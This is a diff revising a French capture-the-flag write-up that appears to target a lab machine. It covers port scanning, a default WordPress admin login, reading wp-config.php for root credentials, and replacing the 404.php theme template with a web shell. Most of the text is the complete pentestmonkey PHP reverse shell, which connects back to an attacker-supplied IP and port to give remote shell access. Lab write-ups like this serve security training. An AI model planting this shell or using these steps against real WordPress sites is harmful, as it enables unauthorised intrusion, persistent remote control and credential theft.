@@ -1,45 +1,53 @@
-Nous commençons par démarer la machine ;)
+Nous commençons par démarrer la machine ;)
 
-Machine attacké : 10.10.115.42
+Machine attaquée : 10.10.115.42
 
-on commençe par analysé les ports ouverts :
+On commence par analyser les ports ouverts :
 
-nmap 10.10.115.42 
+```
+nmap 10.10.115.42
+```
 
-![alt text](./imgs/j1/1-nmap.png)
+![alt text](../.markdown/jour1/1-nmap.png)
 
-on voit q'il ya nottament le port 80 (Service http de disponible)
+On voit qu'il y a notamment le port 80 (service HTTP disponible).
 
-on allant sur la page 
+En allant sur la page 
 
+```
 http://10.10.115.42/
+```
 
-on tombe sur la page d'acceuil
-![alt text](./imgs/j1/2-page_accueil.png)
+On tombe sur la page d'accueil.
 
-on voit que la photo est clickable 
-![alt text](<./imgs/j1/3-en clickant sur l'image d'accueil.png>)
+![alt text](../.markdown/jour1/2-page_accueil.png)
 
-Rien d'intéressant
+On voit que la photo est cliquable.
 
-on annalyse le site pour voir les pages disponibles on en a plusieurs
-![alt text](<./imgs/j1/4-dirsearch.png>)
+![alt text](../.markdown/jour1/3-en_clickant_sur_l_image_d_accueil.png)
 
- wordpress/wp-login.php 
+Rien d'intéressant.
 
- et on test des logins connu admin:admin 
+On analyse le site pour voir les pages disponibles et on en trouve plusieurs.
 
- ![alt text](<./imgs/j1/5-acces page admin wordpress.png>)
+![alt text](../.markdown/jour1/4-dirsearch.png)
 
- Bingo!
+`wordpress/wp-login.php`
 
- on va aller sur Apearence/Editor
+On teste des identifiants connus comme `admin:admin`.
 
- ![alt text](<./imgs/j1/7-chemin vers 404.png>)
+![alt text](../.markdown/jour1/5-acces_page_admin_wordpress.png)
 
- puis on remplace le 404 template par un reverse shell
+Bingo !
 
- <?php
+On va dans **Appearance/Editor**.
+
+![alt text](../.markdown/jour1/7-chemin_vers_404.png)
+
+Puis on remplace le template `404.php` par un reverse shell :
+
+```php
+<?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
 //
@@ -85,7 +93,7 @@ on annalyse le site pour voir les pages disponibles on en a plusieurs
 // -----
 // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
 
-set_time_limit (0);
+set_time_limit(0);
 $VERSION = "1.0";
 $ip = '127.0.0.1';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
@@ -96,46 +104,28 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
-//
 // Daemonise ourself if possible to avoid zombies later
-//
 
-// pcntl_fork is hardly ever available, but will allow us to daemonise
-// our php process and avoid zombies.  Worth a try...
 if (function_exists('pcntl_fork')) {
-	// Fork and have the parent process exit
 	$pid = pcntl_fork();
-	
 	if ($pid == -1) {
 		printit("ERROR: Can't fork");
 		exit(1);
 	}
-	
 	if ($pid) {
 		exit(0);  // Parent exits
 	}
-
-	// Make the current process a session leader
-	// Will only succeed if we forked
 	if (posix_setsid() == -1) {
 		printit("Error: Can't setsid()");
 		exit(1);
 	}
-
 	$daemon = 1;
 } else {
 	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
 }
 
-// Change to a safe directory
 chdir("/");
-
-// Remove any umask we inherited
 umask(0);
-
-//
-// Do the reverse shell...
-//
 
 // Open reverse connection
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
@@ -146,9 +136,9 @@ if (!$sock) {
 
 // Spawn shell process
 $descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+   0 => array("pipe", "r"),
+   1 => array("pipe", "w"),
+   2 => array("pipe", "w")
 );
 
 $process = proc_open($shell, $descriptorspec, $pipes);
@@ -158,8 +148,6 @@ if (!is_resource($process)) {
 	exit(1);
 }
 
-// Set everything to non-blocking
-// Reason: Occsionally reads will block, even though stream_select tells us they won't
 stream_set_blocking($pipes[0], 0);
 stream_set_blocking($pipes[1], 0);
 stream_set_blocking($pipes[2], 0);
@@ -168,47 +156,28 @@ stream_set_blocking($sock, 0);
 printit("Successfully opened reverse shell to $ip:$port");
 
 while (1) {
-	// Check for end of TCP connection
 	if (feof($sock)) {
 		printit("ERROR: Shell connection terminated");
 		break;
 	}
-
-	// Check for end of STDOUT
 	if (feof($pipes[1])) {
 		printit("ERROR: Shell process terminated");
 		break;
 	}
 
-	// Wait until a command is end down $sock, or some
-	// command output is available on STDOUT or STDERR
 	$read_a = array($sock, $pipes[1], $pipes[2]);
 	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
 
-	// If we can read from the TCP socket, send
-	// data to process's STDIN
 	if (in_array($sock, $read_a)) {
-		if ($debug) printit("SOCK READ");
 		$input = fread($sock, $chunk_size);
-		if ($debug) printit("SOCK: $input");
 		fwrite($pipes[0], $input);
 	}
-
-	// If we can read from the process's STDOUT
-	// send data down tcp connection
 	if (in_array($pipes[1], $read_a)) {
-		if ($debug) printit("STDOUT READ");
 		$input = fread($pipes[1], $chunk_size);
-		if ($debug) printit("STDOUT: $input");
 		fwrite($sock, $input);
 	}
-
-	// If we can read from the process's STDERR
-	// send data down tcp connection
 	if (in_array($pipes[2], $read_a)) {
-		if ($debug) printit("STDERR READ");
 		$input = fread($pipes[2], $chunk_size);
-		if ($debug) printit("STDERR: $input");
 		fwrite($sock, $input);
 	}
 }
@@ -219,57 +188,57 @@ fclose($pipes[1]);
 fclose($pipes[2]);
 proc_close($process);
 
-// Like print, but does nothing if we've daemonised ourself
-// (I can't figure out how to redirect STDOUT like a proper daemon)
-function printit ($string) {
+function printit($string) {
 	if (!$daemon) {
 		print "$string\n";
 	}
 }
 
-?> 
+?>
+```
 
+**N'oubliez pas de changer le port et de mettre votre IP.**
 
-"N'oubliez pas de changer le port et de mettre votre IP"
+![alt text](../.markdown/jour1/8-choix_de_404.png)
 
-![alt text](<./imgs/j1/8-choix de 404.png>)
+Puis on valide.
 
-puis on valide
+![alt text](../.markdown/jour1/9-mise_de_reverseshell.png)
 
-![alt text](<./imgs/j1/9-mise de reverseshell.png>)
+Parfait, ça marche !
 
-parfait ça marche
+On met le port en écoute.
 
-on met le port en écoute
+![alt text](../.markdown/jour1/10-port_sous_ecoute.png)
 
-![alt text](<./imgs/j1/10-port sous écoute.png>)
+Puis on lance la page où l'on a mis le reverse shell :
 
-puis on lance la page ou l'on a mis le reverse shell
-
+```
 /wp-content/themes/twentyfourteen/404.php
+```
 
-![alt text](<./imgs/j1/11-bingo got reverse shell.png>)
+![alt text](../.markdown/jour1/11-bingo_got_reverse_shell.png)
 
-Siuuu ! on a un reverse shell
+Siuuu ! On a un reverse shell.
 
-on va à home/wpadmin et on retrouve le user flag
+On va dans `home/wpadmin` et on retrouve le user flag.
 
-![alt text](<./imgs/j1/12-User flag.png>)
+![alt text](../.markdown/jour1/12-User_flag.png)
 
-on va aller voir wp-config.php pour potentiellement avoir des infos critique
+On va aller voir `wp-config.php` pour potentiellement avoir des informations critiques.
 
-![alt text](<./imgs/j1/13-root login infos.png>)
+![alt text](../.markdown/jour1/13-root_login_infos.png)
 
-wow c'est marqué en grand on a les logins infos root
+Wow, c'est indiqué en grand, on a les informations de connexion root.
 
-on va se connecter en tant que root
+On se connecte en tant que root.
 
-![alt text](<./imgs/j1/14-accées en tant que root.png>)
+![alt text](../.markdown/jour1/14-acces_en_tant_que_root.png)
 
-let's goo on est root
+Let's go ! On est root.
 
-il ne reste plus qu'à prendre le root flag
+Il ne reste plus qu'à récupérer le root flag.
 
-![alt text](<./imgs/j1/15-root flag.png>)
+![alt text](../.markdown/jour1/15-root_flag.png)
 
-et voila !!
+Et voilà !
